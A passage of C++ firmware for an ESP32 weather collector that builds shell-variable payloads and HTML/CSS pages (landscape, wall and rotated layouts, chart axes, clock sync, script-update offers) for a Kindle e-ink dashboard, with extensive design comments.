    // over the file it loaded, so the file stays the description of
    // everything that does not move. A reader running an older update_dash.sh
    // drops every LY_ key and keeps drawing the fixed page it always has,
    // from the GRID_ROWS, PAGE_MODE and CH_* keys above and below, which keep
    // their old meaning for it.
    {
        // STATIC, not on the stack: the landscape page's keys took the table
        // to ninety entries, 720 bytes, in a handler that already holds three
        // 24-hour trend series there. The async server runs one handler at a
        // time on its own task, so one table is all that is ever in use.
        static KdFlowKV kv[KDF_PANEL_KEYS];
        const int nkv = kdFlowPanelKeys(rd.flow, resW, kv);
        for (int i = 0; i < nkv; i++) {
            int v = kv[i].value;
            // The width /kindle/graph.bmp?w= will actually serve, which the
            // panel then requires the image to be — clampW's, not the flow's.
            if (!strcmp(kv[i].key, "GR_W"))
                v = ChartBmp::clampW((uint16_t)v, skin.fbinkResW);
            s->printf("LY_%s=%d\n", kv[i].key, v);
        }
        char rows[16];
        kdFlowRowsText(rd.flow, rows, sizeof(rows));
        kdShellVar(s, "LY_GRID_ROWS", rows);
    }
    // The page's own size, which on its side is the panel's turned: the reader
    // draws in those coordinates and leaves the turning to the framebuffer.
    // The layout keys above are scaled by the SHORT side on either page.
    const uint16_t resH = (resW > 600) ? 1448 : 800;
    const bool land = kdRotLandscape(rot);
    kdShellUint(s, "RES_W", land ? resH : resW);
    kdShellUint(s, "RES_H", land ? resW : resH);
    kdShellInt(s, "PAGE_ROT", (int)rot * 90);
    kdShellVar(s, "LANG", KD_T("en", "bg"));
    kdShellInt(s, "DECIMALS", skin.tempDecimals);
    kdShellInt(s, "CLOCK_STYLE", skin.clockStyle);
    // The face (KFACE_*), for the panel to draw in when the reader has its
    // files; a list of the reader's own names is a browser thing, and the
    // panel keeps Bookerly for it. An older script ignores the key.
    kdShellInt(s, "FONT_FACE", skin.face < KFACE_CUSTOM ? skin.face : KFACE_BOOKERLY);
    // How the week strip's cells are drawn (KWEEK_*), and the dividing lines:
    // their thickness at this panel's size, their pens and their style
    // (0 solid, 1 dashed, 2 dotted). A reader too old to know these draws
    // the page's defaults, which are what 0 in each means anyway.
    kdShellInt(s, "WK_STYLE", kdWeekStyle(skin));
    kdShellInt(s, "RULE_PX", kdfMax(1, kdFlowPanel(kdRulePx(skin), resW)));
    s->printf("RULE_INK=%s\nRULE_SOFT=%s\nRULE_STYLE=%d\n",
              kdRuleFbink(kdRuleInk(skin), false), kdRuleFbink(kdRuleInk(skin), true),
              kdRuleStyle(skin));
    kdShellInt(s, "TIME_FORMAT", skin.timeFormat);
    kdShellUint(s, "SHOW_FLAGS", skin.showFlags);

    // THE SWITCHES SPELT OUT, one key each, rather than left as bits of
    // SHOW_FLAGS for the reader to mask. Decoding them there would be a second
    // copy of KSHOW_CHART's numeric value living in a shell script, and the
    // day one of them moves is the day the panel starts hiding the wrong
    // section. The grid and the indoor row are already handled this way —
    // emitZones() sends an empty list for a group that is switched off.
    kdShellInt(s, "SHOW_CHART", (skin.showFlags & KSHOW_CHART) ? 1 : 0);
    kdShellInt(s, "SHOW_WEEK", (skin.showFlags & KSHOW_WEEK)  ? 1 : 0);
    kdShellInt(s, "SHOW_CLOCK", (kdShowMask(skin) & KSHOW_CLOCK) ? 1 : 0);

    // THE TIME, FOR THE READER TO SET ITS OWN CLOCK BY — which it does once
    // every SYNC_DAYS days, not on every fetch: between those it keeps its own
    // time, and draws the clock from it whether or not this end answers.
    // TIME_OFF is this collector's zone, daylight saving included, so the
    // panel shows the time the web page shows. Neither is sent without a real
    // time to send: a collector still at 1970 would set the reader back to it.
    kdShellUint(s, "SYNC_DAYS", (unsigned)kdClockSyncDays(skin));
    {
        // The same instant every age in this payload was measured against.
        if (now > 1000000000u) {
            kdShellUint(s, "TIME_UTC", (unsigned long)now);
            // The offset in effect NOW, so the panel follows the change
            // to and from summer time on its next fetch.
            kdShellInt(s, "TIME_OFF", tzOffsetAt((time_t)now));
        } else {
            s->print("TIME_UTC=\nTIME_OFF=\n");
        }
    }

    // WHICH SHAPE THE PAGE IS, decided here and nowhere else. The panel has
    // the coordinates for both and no way to know which applies: only this end
    // knows whether a forecast is coming. A reader running an older
    // update_dash.sh ignores the key and keeps the page it has always drawn.
    kdShellVar(s, "PAGE_MODE", standalone ? "standalone" : "normal");

    // Whether the chart has anything in it, which is what decides if the key
    // under it is drawn — the same test the page makes before drawing its own.
    // A key naming two lines over an empty grid describes a chart that is not
    // there.
    if (chartFine) kdChartUseFine(now, tOut, tIn, haveOut, haveIn);
    kdShellInt(s, "CHART_OUT", (haveOut && seriesHasData(tOut)) ? 1 : 0);
    kdShellInt(s, "CHART_IN", (haveIn  && seriesHasData(tIn))  ? 1 : 0);

    // ── The chart's axis, which the image itself cannot carry ───────────────
    //
    // The BMP has no labels and cannot have any: drawing text into a 4-bit
    // image would need a bitmap font on the ESP32 that this firmware does not
    // carry, and the note in ChartBmpCtx says where they belong instead —
    // "in /kindle/data next to the rest of the text, and the script should
    // place them". This is that. Until now the panel showed a bare grid while
    // the browser page showed the same grid with five temperatures down the
    // side and five hours along the bottom, and a grid with no numbers on it
    // is a picture of a chart rather than a chart.
    //
    // THE SAME lo/hi THE IMAGE USES, computed the same way — the 6 % padding
    // with a 0.4° floor, from appendChart() and ChartBmpCtx::init() alike. A
    // second opinion here would label the image with somebody else's scale.
    {
        float clo = 1e9f, chi = -1e9f;
        for (int i = 0; i < TrendRing::HOURS; i++) {
            if (haveOut && tOut[i].count) {
                if (tOut[i].min < clo) clo = tOut[i].min;
                if (tOut[i].max > chi) chi = tOut[i].max;
            }
            if (haveIn && tIn[i].count) {
                if (tIn[i].min < clo) clo = tIn[i].min;
                if (tIn[i].max > chi) chi = tIn[i].max;
            }
        }
        const bool haveAny = (clo <= chi);
        if (haveAny) {
            float pad = (chi - clo) * 0.06f;
            if (pad < 0.4f) pad = 0.4f;
            clo -= pad; chi += pad;
            const float cspan = (chi - clo) > 0.001f ? (chi - clo) : 1.0f;
            for (int k = 0; k <= 4; k++) {
                char lbl[12];
                fmtInt(lbl, sizeof(lbl), chi - cspan * (float)k / 4.0f);
                char key[16];
                snprintf(key, sizeof(key), "CH_Y%d", k);
                kdShellVar(s, key, lbl);
                s->printf("CH_Y%dW=%u\n", k, kdAdvanceMille(lbl));
            }
        } else {
            for (int k = 0; k <= 4; k++)
                s->printf("CH_Y%d=\"\"\nCH_Y%dW=0\n", k, k);
        }

        // The hour axis: -23h, -17h, -11h, -5h and "now". Fixed strings, so
        // the reader could hold them — but then "now" would be English on a
        // Bulgarian panel, and the stride would be written down twice.
        for (int k = 0; k < 5; k++) {
            char lbl[12];
            if (k == 4) snprintf(lbl, sizeof(lbl), "%s", KD_T("now", "сега"));
            else        kdChartTick(lbl, sizeof(lbl), k * 6, chartFine);
            char key[16];
            snprintf(key, sizeof(key), "CH_H%d", k);
            kdShellVar(s, key, lbl);
            s->printf("CH_H%dW=%u\n", k, kdAdvanceMille(lbl));
        }

        // WHERE THE PLOT AREA IS INSIDE THE IMAGE, in image pixels, ASKED FOR
        // rather than re-derived. These were a copy of ChartBmpCtx::init()'s
        // arithmetic, which is the thing the comment claimed they avoided: a
        // margin change there would have left the axis labels annotating a
        // plot area the image no longer had, and nothing compiles the shell
        // script that draws them.
        const uint16_t cw = ChartBmp::imageW(skin.fbinkResW);
        const uint16_t ch = ChartBmp::imageH(skin.fbinkResW);
        s->printf("CH_L=%d\nCH_R=%d\nCH_T=%d\nCH_B=%d\n",
                  ChartBmp::marginL(cw), ChartBmp::marginR(cw),
                  ChartBmp::marginT(ch), ChartBmp::marginB(ch));
        // And the same for the image a reader that follows the layout asks for
        // — /kindle/graph.bmp?h=LY_GR_H — which is as tall as the layout left
        // the chart. CH_T/CH_B above stay the fixed image's, because a reader
        // running an older script still fetches that one.
        {
            const uint16_t fh = ChartBmp::clampH(
                (uint16_t)kdFlowPanel(rd.flow.grH, resW), skin.fbinkResW);
            s->printf("LY_CH_T=%d\nLY_CH_B=%d\n",
                      ChartBmp::marginT(fh), ChartBmp::marginB(fh));
            // ...and as wide: ?w=LY_GR_W on the landscape page, where the
            // chart is beside the readings; the fixed width upright.
            const uint16_t fw = rd.flow.land
                ? ChartBmp::clampW((uint16_t)(kdFlowPanel(rd.flow.grW, resW) & ~7),
                                   skin.fbinkResW)
                : cw;
            s->printf("LY_CH_L=%d\nLY_CH_R=%d\n",
                      ChartBmp::marginL(fw), ChartBmp::marginR(fw));
        }

        // What the page prints inside the empty chart. A bare grid reads as
        // "nothing is happening outside" rather than "this has not filled in
        // yet". No "24 hour" in it: the first hours' chart covers two.
        kdShellVar(s, "CH_NOTE", haveAny ? "" :
                   KD_T("The record fills as readings arrive.",
                        "Записът се попълва с постъпването на данни."));
    }

    // ── An update for the reader's own scripts ──────────────────────────────
    //
    // Sent only to a reader that said which version it runs (?pkg=), only
    // while a package is on offer, and only when that reader runs something
    // else — docs/KINDLE_UPDATE.md §3. The reader downloads /kindle/pkg.tar,
    // checks it against these three and installs it; a reader on an older
    // script sends no ?pkg= and is never offered anything it cannot use.
    {
        KindlePkgOffer po;
        if (kindlePkgOffer(req, po)) {
            kdShellVar(s, "PKG_VER", po.ver);
            kdShellVar(s, "PKG_MD5", po.md5);
            kdShellUint(s, "PKG_SIZE", (unsigned long)po.size);
        }
    }

    // ── The last line, and the reason there is one ──────────────────────────
    //
    // THE PANEL CANNOT OTHERWISE TELL A WHOLE PAYLOAD FROM THE FIRST PART OF
    // ONE. This is streamed off an ESP32 while it is also serving the web UI
    // and taking readings, to a ten-year-old reader on wifi; when that
    // connection dies mid-payload, busybox wget does not always call the short
    // read an error, and what lands on the Kindle parses perfectly — every key
    // past the cut simply absent. The page then comes up with a third of its
    // values blank and nothing anywhere to say why, which is exactly the
    // failure the BMP's own length field already catches for the chart.
    //
    // One key, always emitted, always last: update_dash.sh's payload_ok()
    // refuses a payload without it and keeps the previous one instead. A
    // reader running an older script ignores it like any key it does not know.
    s->print("END=1\n");

    req->send(s);
}

/// Appends `sheet` to `p`, replacing every "$n" / "$-n" with kdPx(n). The
/// sheet is the KD_S/KD_N literal in handleKindle(); see the note there. A '$'
/// not followed by a digit or a '-' is copied as it is.
static void kdEmitSheet(String& p, const char* sheet) {
    const char* seg = sheet;
    for (const char* d; (d = strchr(seg, '$')) != nullptr; ) {
        const char* q = d + 1;
        const bool neg = (*q == '-');
        if (neg) q++;
        if (*q < '0' || *q > '9') {             // not a placeholder
            p.concat(seg, (unsigned)(q - seg));
            seg = q;
            continue;
        }
        p.concat(seg, (unsigned)(d - seg));
        int n = 0;
        while (*q >= '0' && *q <= '9') n = n * 10 + (*q++ - '0');
        p += kdPx(neg ? -n : n);
        seg = q;
    }
    p += seg;
}

static void appendChartSection(String& p, const KdRender& rd,
                               const TrendRing::Hour* tOut, const TrendRing::Hour* tIn,
                               bool haveOut, bool haveIn, bool rule) {
    // Beside the readings on the landscape page, where the hairline
    // between the columns is the separator.
    if (rule) p += F("<div class=\"rule\"></div>");
    p += F("<div class=\"sec\">");
    p += rd.chartFine ? kdT("Last 2 hours", "Последните 2 часа")
                      : kdT("Last 24 hours", "Последните 24 часа");
    p += F("</div>");
    appendChart(p, tOut, tIn, haveOut, haveIn, kdPx(kdFlowHtmlChartH(rd.flow)),
                kdPx(rd.flow.grW), rd.chartFine);
    // The key names the lines the chart DREW, which is what appendChart's
    // own lo > hi test turns on — not the series the ring is tracking.
    const bool drewOut = haveOut && seriesHasData(tOut);
    const bool drewIn  = haveIn  && seriesHasData(tIn);
    if (drewOut || drewIn) {
        // The two swatches must be drawn with the same stroke as the lines
        // they stand for — .l-out #000/3, .l-in #777/2 dashed — or the key
        // describes a chart the reader is not looking at.
        p += F("<table class=\"key\"><tr><td>");
        appendKeySwatch(p, "#000", 3, false);
        p += ' ';
        p += kdT("outside mean", "средно навън");
        // Only where there is room for it: the landscape chart is narrower.
        if (rd.flow.keyBand) {
            p += F("<span class=\"dim\">");
            p += kdT(", shaded band = hourly low to high",
                     ", сивото е час. мин&ndash;макс");
            p += F("</span>");
        }
        p += F("</td><td style=\"text-align:right\">");
        appendKeySwatch(p, "#777", 2, true);
        p += ' ';
        p += kdT("inside", "вътре");
        p += F("</td></tr></table>");
    }
}

/// The landscape page, 800 x 600 — see kdFlowLand(): the clock and the week
/// strip in a row across the top, the readings beside the chart, the forecast
/// band with five outlook columns, and the footer.
static void appendLandBody(String& p, const KindleConfig& skin, uint32_t now,
                           const KdRender& rd,
                           const TrendRing::Hour* tOut, const TrendRing::Hour* tIn,
                           bool haveOut, bool haveIn) {
    const KdFlow& f = rd.flow;
    const bool week = (skin.showFlags & KSHOW_WEEK) && now > 1000000000u;
    if (f.clock || week) {
        p += F("<table class=\"trow\"><tr>");
        if (f.clock) {
            // The whole row when the week is not drawn beside it — which the
            // layout cannot know about a collector with no time yet.
            p += week ? F("<td class=\"tclk\">")
                      : F("<td class=\"tclk\" style=\"width:100%;text-align:center\">");
            appendClock(p, skin, now);
            p += F("</td>");
        }
        if (week) {
            p += F("<td class=\"twk\">");
            appendWeekStrip(p, skin, now, false);
            p += F("</td>");
        }
        p += F("</tr></table><div class=\"rule\"></div>");
    }

    bool visible[KZ_COUNT];
    kdZoneVisibility(rd.res, visible);
    p += f.chart ? F("<table class=\"top\"><tr><td class=\"col-l\">")
                 : F("<table class=\"top\"><tr><td class=\"col-l\" width=\"100%\">");
    appendOutdoor(p, skin, rd, visible);
    appendIndoor(p, rd, visible, true);
    if (f.chart) {
        p += F("</td><td class=\"col-r sep\">");
        appendChartSection(p, rd, tOut, tIn, haveOut, haveIn, false);
    }
    p += F("</td></tr></table>");

#ifdef MODULE_FORECAST_ENABLED
    if (f.forecast) appendForecastSection(p, ForecastModule::OUTLOOK_N, kdWeekFcOn(skin, now));
#endif
}

// ---------------------------------------------------------------------------
// The wall page — kdFlowWall()
// ---------------------------------------------------------------------------
/// Where a block on the wall page starts: the layout's design pixel, less the
/// body's padding, which the box everything is placed in sits inside.
static void kdWallAt(String& p, const char* cls, int x, int y, int w = 0, int h = 0) {
    p += F("<div class=\"wa");
    if (cls && *cls) { p += ' '; p += cls; }
    p += F("\" style=\"left:");
    p += kdPx(x - 18);
    p += F("px;top:");
    p += kdPx(y - 14);
    p += F("px");
    if (w > 0) { p += F(";width:"); p += kdPx(w); p += F("px"); }
    if (h > 0) { p += F(";height:"); p += kdPx(h); p += F("px"); }
    p += F("\">");
}

/// The outdoor mean of the last 24 hours behind the wall page's headline, light
/// grey and thick, edge to edge of its row: the panel's own graph.bmp?line=1,
/// which the browser stretches over the row as an image.
static void appendHeroLine(String& p, const KdFlow& f, bool inv) {
    const int H = f.subY - f.heroY;
    kdWallAt(p, "", f.colLX, f.heroY, f.headW, H);
    p += F("<img src=\"/kindle/graph.bmp?line=1&amp;w=");
    p += f.headW;
    p += F("&amp;h=");
    p += H;
    if (inv) p += F("&amp;inv=1");
    p += F("\" width=\"100%\" height=\"100%\" alt=\"\"></div>");
}

/// White on black (KSLOTF_INV): the black plate, and a box the blocks drawn
/// on it go in, closed by the caller. The box takes no place of its own, so
/// they are still placed against the page's.
static void kdWallPlate(String& p, int x, int y, int w, int h) {
    kdWallAt(p, "invp", x, y, w, h);
    p += F("</div><div class=\"wi\">");
}

/// A hairline of the wall page: across when `w`, down when `h`.
static void kdWallRule(String& p, int x, int y, int w, int h) {
    kdWallAt(p, w ? "wr" : "wv", x, y, w, w ? 0 : h);
    p += F("</div>");
}

#ifdef MODULE_FORECAST_ENABLED
/// The forecast beside the clock: the condition word where a heading would
/// be, as large as the column allows up to the layout's size — "Променлива
/// облачност" has to fit the width "Ясно" does — the icon under it with the
/// wind and the age beside it, one to a line, and the day's high and low
/// under the icon.
static void appendWallForecast(String& p, const KdFlow& f) {
    const ForecastModule::Data d = forecastModule.snapshot();
    if (!d.valid) return;
    const char* word = forecastSummary(d);
    const unsigned adv = kdAdvanceMille(word);
    int sz = f.fcTextSz;
    if (adv) sz = kdfMax(12, kdfMin(sz, (int)(f.fcTextW * 1000u / adv)));
    kdWallAt(p, "wfc wfs ctr", f.fcTextX, f.fcTextY, f.fcTextW);
    p += F("<span style=\"font-size:"); p += kdPx(sz); p += F("px\">");
    p += word;
    p += F("</span></div>");
    kdWallAt(p, "", f.fcIconX, f.fcIconY);
    appendWeatherIcon(p, d.code, kdPx(KDF_WALL_FC_ICON));
    p += F("</div>");
    if (isfinite(d.highC) && isfinite(d.lowC)) {
        kdWallAt(p, "wfc fc-t", f.fcTempX, f.fcTempY);
        p += (int)lroundf(d.highC);
        p += F("&deg;/");
        p += (int)lroundf(d.lowC);
        p += F("&deg;</div>");
    }
    kdWallAt(p, "wfc wfw", f.fcWindX, f.fcWindY);
    if (isfinite(d.windKph)) {
        p += kdT("wind", "вятър");
        p += F("<br>");
        p += (int)(d.windKph + 0.5f);
        p += F(" km/h<br>");
    }
    char age[16];
    forecastAgeText(age, sizeof(age), d.fetchedAt, (uint32_t)time(nullptr));
    p += age;
    p += F("</div>");
}
#endif

/// The wall page, 600 x 800: every block where kdFlowWall() put it, in one
/// box the height of the page down to the footer.
static void appendWallBody(String& p, const KindleConfig& skin, uint32_t now,
                           const KdRender& rd) {
    const KdFlow& f = rd.flow;
    const KdResolved* res = rd.res;
    const KindleZones& zones = kdSlots();
    bool visible[KZ_COUNT];
    kdZoneVisibility(res, visible);

    p += F("<div class=\"wl\" style=\"height:");
    p += kdPx(f.footY - 14);
    p += F("px\">");

    // ── The headline, across the page ──
    // White on black when it asked to be: a plate under its whole row — down
    // to the band under it, when there is one, with white between the two.
    const bool hInv = zones.z[KZ_HERO].flags & KSLOTF_INV;
    const bool band = skin.subBand && rd.sub[0];
    if (hInv) {
        kdWallPlate(p, f.colLX - 6, f.groupY - 6, f.headW + 12,
                    (band ? f.subY - 8 : f.headRuleY - 4) - (f.groupY - 6));
    }
    // The outdoor line behind the figures, on the plate.
    if (rd.heroLine) appendHeroLine(p, f, hInv);
    kdWallAt(p, "lab", f.colLX, f.groupY, f.headW);
    appendEscaped(p, kdGroupOutLabel(zones));
    if ((skin.showFlags & KSHOW_BATTERY) && batteryWarningActive())
        appendBatteryBadge(p);
    p += F("</div>");
    const bool big = (skin.showFlags & KSHOW_BIG) && zones.z[KZ_BIG].used() &&
                     res[KZ_BIG].ok;
    kdWallAt(p, big ? "head" : "head ctr", f.colLX, f.heroY, f.headW);
    appendValue(p, res[KZ_HERO], zones.z[KZ_HERO], "v1");
    if (big) {
        p += F("<span class=\"slash\">/</span>");
        appendValue(p, res[KZ_BIG], zones.z[KZ_BIG], "v2");
    }
    p += F("</div>");
    if (hInv && band) p += F("</div>");
    // The 24 h range: on a band across the page in its own shades, centred,
    // which is the line between the headline and the rest — or under the
    // headline as on the desk page, with the rule.
    if (band) kdWallAt(p, "sub ctr wb", 18, f.subY - 6, 564, f.subSz + 12);
    else if (rd.sub[0]) kdWallAt(p, big ? "sub" : "sub ctr", f.colLX, f.subY, f.headW);
    if (rd.sub[0]) {
        appendEscaped(p, rd.sub);
        p += F("</div>");
    }
    if (hInv && !band) p += F("</div>");
    if (!band) kdWallRule(p, 18, f.headRuleY, 564, 0);

    // ── The grid, on the left ──
    if (f.gridNRows) {
        uint8_t used[KZ_GRID_COUNT];
        const int n = kdGridUsed(zones, visible, used);
        int at = 0;
        // A hairline between the places, across between the rows and down
        // between the two of a row: at the middle of the air between the
        // rows, and 8 px left of a cell, in the gutter its neighbour keeps.
        const int cellH = f.labSz + 4 + f.gridValSz;
        for (int r = 0; r < f.gridNRows; r++) {
            const int y = f.gridY + r * f.gridRowH;
            if (r) kdWallRule(p, f.colLX, y - (f.gridRowH - cellH) / 2, f.colLW - 8, 0);
            for (int c = 1; c < f.gridRows[r]; c++)
                kdWallRule(p, f.colLX + c * f.colLW / f.gridRows[r] - 8, y - 2, 0, cellH + 4);
            kdWallAt(p, "", f.colLX, y, f.colLW);
            at = appendGridRow(p, rd, used, n, at, r);
            p += F("</div>");
        }
    }
    if (f.sepH > 0) kdWallRule(p, f.sepX, f.sepY, 0, f.sepH);

    // ── The indoor readings, one under the other ──
    if (f.inValSz1) {
        uint8_t used[KZ_INDOOR_COUNT];
        const int n = kdIndoorUsed(zones, visible, used);
        kdWallAt(p, "lab ctr", f.inX, f.inLabY, f.inW);
        appendEscaped(p, kdGroupInLabel(zones));
        p += F("</div>");
        for (int i = 0; i < n && i < 3; i++) {
            const int y = i == 0 ? f.inValY : (i == 1 ? f.inVal2Y : f.inVal3Y);
            const KdResolved& r = res[used[i]];
            const KindleSlot& sl = zones.z[used[i]];
            const bool inv = sl.flags & KSLOTF_INV;
            const int vsz = i == 0 ? f.inValSz1 : f.inValSz;
            if (inv) {
                const int top = i ? y - f.labSz - 10 : y - 6;
                kdWallPlate(p, f.inX - 6, top, f.inW, y + vsz + 6 - top);
            }
            if (i) {
                kdWallAt(p, "lab ctr", f.inX, y - f.labSz - 4, f.inW);
                appendEscaped(p, r.ok ? r.label : kdSlotLabel(sl));
                p += F("</div>");
            }
            kdWallAt(p, "cv ctr", f.inX, y, f.inW);
            const char* cls = i == 0 ? "iv iv-1" : "iv";
            appendValue(p, r, sl, cls);
            p += F("</div>");
            if (inv) p += F("</div>");
        }
    }

    // ── The band at the foot: the clock, and the forecast beside it ──
    if (f.rule3Y < f.footY) {
        kdWallRule(p, 18, f.rule3Y, 564, 0);
        if (f.clock) {
            // Alone it is centred in the band, beside the forecast it starts
            // at the margin — see kdFlowWall().
            const bool alone = f.sep2H == 0;
            kdWallAt(p, alone ? "wclk ctr" : "wclk", 18, f.clY, alone ? 564 : f.clW);
            appendClock(p, skin, now);
            p += F("</div>");
        }
        if (f.sep2H > 0) kdWallRule(p, f.sep2X, f.sep2Y, 0, f.sep2H);
#ifdef MODULE_FORECAST_ENABLED
        if (f.forecast) appendWallForecast(p, f);
#endif
    }
    p += F("</div>");
}

/// The wall page's own rules, after the layout's: every block placed where
/// kdFlowWall() put it, the captions and the line under the headline in black
/// rather than grey, every value bold, and the hairlines at the rules' setting
/// — which kdWallSkin() has made the heaviest black unless it was chosen.
static void kdWallCss(String& p, const KindleConfig& skin, const KdFlow& f) {
    static const char* const style[3] = {"solid", "dashed", "dotted"};
    const int w = kdPx(kdRulePx(skin));
    const char* st  = style[kdRuleStyle(skin) % 3];
    const char* ink = kdRuleCss(kdRuleInk(skin), false);
    // The second value black like the first — and the inks a place was given
    // after it, so they still win. The rules' .wa is absolute, sized inline.
    p += F(".wa{position:absolute;white-space:nowrap;overflow:hidden}"
           ".wl .lab,.wl .head,.wl .sub,.wl .cv,.wfc{line-height:1;margin:0}"
           ".wl .lab,.wl .sub,.wl .slash{color:#000}.lu{text-transform:none}"
           ".wl .grid{margin-top:0}.wl .grid td{height:auto;vertical-align:top;text-align:center}"
           ".wl .v1,.wl .v2,.wl .gv,.wl .iv{font-weight:700}"
           ".v2{color:#000}.ink-d{color:#444}.ink-m{color:#777}.ink-l{color:#aaa}"
           ".wa.wr{height:0;overflow:visible}.wa.wv{width:0;overflow:visible}"
           ".foot{margin-top:0}.wl .fc-t{font-weight:700;margin:0}.wl .wfw{color:#444;line-height:1.33}.wfs{font-weight:700}"
           ".wl .cv,.wl .gv{position:relative}.cl{position:absolute;left:0;top:0;width:100%;height:100%}"
           ".wl{position:relative;width:");
    p += kdPx(564);
    p += F("px}.wl .grid .lab{margin-bottom:"); p += kdPx(4);
    p += F("px}.wr{border-top:"); p += w; p += F("px ");
    p += st; p += ' '; p += ink;
    p += F("}.wv{border-left:"); p += w; p += F("px ");
    p += st; p += ' '; p += ink;
    p += F("}.wl .wb{padding-top:.35em;background:"); p += kdShadeCss(kdSubBandShade(skin.subBand));
    p += F(";color:"); p += kdShadeCss(kdSubInkShade(skin.subBand, skin.subInk));
    p += F("}.wl .fc-t{font-size:"); p += kdPx(f.fcTempSz);
    p += F("px}.wfw{font-size:"); p += kdPx(f.fcWindSz); p += F("px}");
}

/// The page turned a quarter or a half: drawn upright in a box the size of
/// the turned page, and the box rotated onto the screen about its top-left
/// corner and moved back into view. -webkit- first, for the reader's old
/// WebKit, which has had 2D transforms since before any Kindle shipped it.
/// The body loses its padding to the box, which carries the same.
static void kdRotCss(String& p, uint8_t rot) {
    if (rot == KROT_0) return;
    const bool land = kdRotLandscape(rot);
    const int W = kdPx(land ? 800 : 600), H = kdPx(land ? 600 : 800);
    char t[64];
    switch (rot) {
        case KROT_90:  snprintf(t, sizeof(t), "translate(%dpx,0) rotate(90deg)", kdPx(600)); break;
        case KROT_180: snprintf(t, sizeof(t), "translate(%dpx,%dpx) rotate(180deg)",
                                kdPx(600), kdPx(800)); break;
        default:       snprintf(t, sizeof(t), "translate(0,%dpx) rotate(-90deg)", kdPx(800)); break;
    }
    p += F("body{padding:0;overflow:hidden}.rot{position:absolute;left:0;top:0;width:");
    p += W; p += F("px;height:"); p += H; p += F("px;padding:");
    p += kdPx(14); p += F("px "); p += kdPx(18);
    p += F("px;overflow:hidden;-webkit-transform-origin:0 0;transform-origin:0 0;"
           "-webkit-transform:");
    p += t; p += F(";transform:"); p += t; p += '}';
}

static void handleKindle(AsyncWebServerRequest* req) {
    // THE LANGUAGE, FIRST, BEFORE ANYTHING IS WORDED. kdT() and the weekday and
    // month tables read one ambient value rather than taking a parameter each —
    // see DashboardStrings.h for why — and this is where it is set. Every page
    // is rendered start to finish on the async web server's own task, so
    // nothing else is looking at it in between.
    kdLangBegin(config.kindle.lang);

    // ONLY WHAT THIS PAGE STILL READS. The outdoor humidity and pressure and
    // the indoor humidity were fetched here when the layout hardwired them;
    // the places resolve their own readings now, and these were left behind
    // costing two ring-buffer lookups under the data mutex on every render.
    // The pressure series cost more: a full twenty-four-hour walk of the trend
    // ring, computed and then dropped.
    //
    // The two temperatures stay because the refresh cadence below is derived
    // from whichever of them is newer, and the two temperature series stay
    // because the chart draws them.
    const Latest outT = latestOf(outdoorSensorId(), "temperature");
    const Latest inT  = latestOf(indoorSensorId(),  "temperature");

    const uint32_t now = (uint32_t)time(nullptr);

    TrendRing::Hour tOut[TrendRing::HOURS];
    TrendRing::Hour tIn [TrendRing::HOURS];
    const bool haveOut = trendRing.series(outdoorSensorId(), "temperature", now, tOut);
    const bool haveIn  = trendRing.series(indoorSensorId(),  "temperature", now, tIn);
    const bool chartFine = kdChartWantsFine(tOut, tIn, haveOut, haveIn);
    if (chartFine) kdChartUseFine(now, tOut, tIn, haveOut, haveIn);

    // A clamped COPY, not a reference into the live config. The page reads
    // this a dozen times while it builds; taking the values once means a save
    // landing mid-render cannot produce a page whose stylesheet and markup
    // disagree about which clock is being drawn.
    KindleConfig skin = config.kindle;
    kdSkinClamp(skin);

    // The reader's own width, before the first size is taken — kdPx() reads
    // it from here until this function returns. See kdPageFor().
    const KdPage pg = kdPageFor(req, skin);
    KdPageScope pageScope(pg.w);

    // The places and where everything goes, once for the whole page: the
    // stylesheet's sizes and the markup's rows have to come from one answer.
    const uint8_t rot = kdRotFor(req, kdPageRot(skin));
    const bool wall = kdWallFor(skin.webStyle, rot, true);
    const bool heroLine = wall && (skin.showFlags & KSHOW_CHART);
    if (wall) kdWallSkin(skin);
    KdRender rd;
    kdRenderBegin(rd, skin, now, kdStandalone(), true, kdRotLandscape(rot), true, wall);
    rd.heroLine = heroLine;
    rd.chartFine = chartFine;

    String p;
    p.reserve(7000);
    char buf[16];

    p += F("<!DOCTYPE html><html><head><meta charset=\"UTF-8\">"
           "<meta name=\"viewport\" content=\"width=");
    p += pg.screenW ? pg.screenW : pg.w;
    p += F("\"><meta http-equiv=\"refresh\" content=\"");
    // Newest of the two sensors: the page is current if either one is, and
    // waiting on the slower of the pair would show a stale outdoor reading.
    // The clock only makes its once-a-minute demand when it is actually drawn
    // — an unsynced device prints "clock not set" and has nothing to keep
    // fresh, so it must be allowed to back off like any other stale source.
    // The stored cadence, with the compile-time knobs as the defaults. 0 and
    // 0xFF are the "not configured" sentinels — see KindleConfig — so a device
    // that has never opened the settings form behaves exactly as it did before
    // the fields existed.
    KdCadence cad;
    if (skin.refreshSec)             cad.refreshSec      = skin.refreshSec;
    if (skin.followData != 0xFF)     cad.followData      = (skin.followData != 0);
    if (skin.clockPinRefresh != 0xFF) cad.clockPinRefresh = (skin.clockPinRefresh != 0);
    cad.clamp();

    p += kdRefreshDelaySec(outT.ts > inT.ts ? outT.ts : inT.ts, now,
                           now > KINDLE_MIN_REAL_TS, cad);
    p += F("\"><title>");
    p += kdT("Weather", "Времето");
    p += F("</title>");
    kdAutoScript(p, req, skin);
    p += F("<style>");

    // The stylesheet: every number in it is a 600-px-layout figure passed
    // through kdPx(). KD_S is a literal fragment, KD_N a scaled number —
    // reading a line as "fragment, number, fragment" is how to check one
    // against the design it came from.
    //
    // ONE CALL, NOT 271. The macros only build a string literal: KD_N(14)
    // becomes "$14", and the whole sheet below is one argument that
    // kdEmitSheet() walks at run time, scaling each $n as it goes. Written as
    // one `p +=` per fragment it was the same text plus 2.7 KB of call sites.
    // Keep it to KD_S and KD_N — no statement, no branch, no semicolon — both
    // because it is one expression and because tools/kindle_preview and
    // tools/check_kindle_parity.py rebuild this sheet by reading these lines.
    #define KD_S(lit) lit
    #define KD_N(n)   "$" #n
    kdEmitSheet(p,
    KD_S("body{font-family:Bookerly,Caecilia,Georgia,'Times New Roman',serif;"
         "margin:0;padding:")                 KD_N(14)
    KD_S("px ")                               KD_N(18)
    KD_S("px;background:#fff;color:#000;-webkit-text-size-adjust:none}"
         "*{box-sizing:border-box}"
         "table{width:100%;border-collapse:collapse}"
         "td{vertical-align:top;padding:0}")

    // Palette: #000 #444 #777 #aaa #d8d8d8 #fff. The panel has 16 real grey
    // levels — the dithering that argued against greys here comes from
    // gradients and from tones too close together, not from flat
    // well-separated fills. Spaced this far apart each renders solid.
